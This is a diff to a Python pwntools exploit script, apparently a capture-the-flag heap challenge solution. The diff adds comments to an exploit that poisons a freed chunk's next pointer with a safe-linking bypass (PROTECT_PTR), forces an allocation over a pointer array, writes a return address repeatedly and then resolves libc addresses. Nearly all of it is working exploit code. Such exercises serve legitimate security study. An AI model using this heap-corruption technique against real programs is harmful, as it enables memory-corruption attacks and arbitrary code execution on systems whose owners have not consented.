@@ -98,7 +98,7 @@ def  PROTECT_PTR(pos, ptr):
 
 # find stack address:
 # - alloc
-# - change -> win
+# - change -> win (alloca is on the stack)
 #
 # find libc addr:
 # - allocate big chunk
@@ -135,11 +135,14 @@ print("this one ^")
 print("protection_location: ", hex(protection_location))
 dealloc(strings_n)
 
+# change next ptr to point onto strings_p
 change(strings_n, 0x8, p64(PROTECT_PTR(protection_location, protection_location+0x40-0x10)))
 
+# allocate once so next chunk to be allocated will be strings_p ^^^^^^^^^
 alloc(0x38, cyclic(0x38))
 alloc(0x38, p64(ret_addr)*7)
-
+# the realloc in alloc(void) will not move strings_p if there is still enough space
+# this is possible because each pointer takes 8 byte, but chunk sizes are 16, 32, ...
 
 libc = ELF("libc.so.6")
 libc.address = libc_addr
